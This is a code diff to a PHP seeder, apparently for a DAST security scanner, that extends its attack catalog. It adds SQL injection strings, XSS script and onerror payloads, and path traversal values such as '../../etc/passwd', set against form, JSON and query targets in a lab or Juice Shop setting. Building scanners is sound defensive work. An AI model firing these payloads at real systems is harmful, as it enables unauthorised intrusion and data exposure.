@@ -18,6 +18,37 @@ class AttackCatalogSeeder extends Seeder
     use WithoutModelEvents;
 
     /**
+     * Generic SQLi variants: lab form login, Juice Shop JSON login, and REST search.
+     *
+     * @var list<string>
+     */
+    private const SQL_VALUES = [
+        "' OR 1=1 --",
+        "' or 1=1--",
+        "')) OR 1=1--",
+    ];
+
+    /**
+     * @var list<string>
+     */
+    private const XSS_VALUES = [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+    ];
+
+    /**
+     * Lab path plus generic LFI. No field lock — mapper iterates vector params.
+     *
+     * @var list<string>
+     */
+    private const PATH_VALUES = [
+        '../storage/secret.txt',
+        'secret.txt',
+        '../../etc/passwd',
+        '....//....//etc/passwd',
+    ];
+
+    /**
      * @var list<array{
      *     scan_type: AttackScanType,
      *     category: AttackCategory,
@@ -32,14 +63,50 @@ class AttackCatalogSeeder extends Seeder
             'category' => AttackCategory::SqlInjection,
             'target_location' => AttackTargetLocation::Form,
             'risk_level' => AttackRiskLevel::High,
-            'payload' => ['field' => 'email', 'value' => "' OR 1=1 --"],
+            'payload' => [
+                'value' => "' OR 1=1 --",
+                'values' => self::SQL_VALUES,
+            ],
+        ],
+        [
+            'scan_type' => AttackScanType::Dast,
+            'category' => AttackCategory::SqlInjection,
+            'target_location' => AttackTargetLocation::JsonBody,
+            'risk_level' => AttackRiskLevel::High,
+            'payload' => [
+                'value' => "' OR 1=1 --",
+                'values' => self::SQL_VALUES,
+            ],
+        ],
+        [
+            'scan_type' => AttackScanType::Dast,
+            'category' => AttackCategory::SqlInjection,
+            'target_location' => AttackTargetLocation::QueryParameter,
+            'risk_level' => AttackRiskLevel::High,
+            'payload' => [
+                'value' => "' OR 1=1 --",
+                'values' => self::SQL_VALUES,
+            ],
         ],
         [
             'scan_type' => AttackScanType::Dast,
             'category' => AttackCategory::Xss,
             'target_location' => AttackTargetLocation::QueryParameter,
             'risk_level' => AttackRiskLevel::Medium,
-            'payload' => ['parameter' => 'q', 'value' => '<script>alert(1)</script>'],
+            'payload' => [
+                'value' => '<script>alert(1)</script>',
+                'values' => self::XSS_VALUES,
+            ],
+        ],
+        [
+            'scan_type' => AttackScanType::Dast,
+            'category' => AttackCategory::Xss,
+            'target_location' => AttackTargetLocation::JsonBody,
+            'risk_level' => AttackRiskLevel::Medium,
+            'payload' => [
+                'value' => '<script>alert(1)</script>',
+                'values' => self::XSS_VALUES,
+            ],
         ],
         [
             'scan_type' => AttackScanType::Dast,
@@ -48,7 +115,7 @@ class AttackCatalogSeeder extends Seeder
             'risk_level' => AttackRiskLevel::High,
             'payload' => [
                 'value' => '../storage/secret.txt',
-                'values' => ['secret.txt', '../storage/secret.txt'],
+                'values' => self::PATH_VALUES,
             ],
         ],
         [
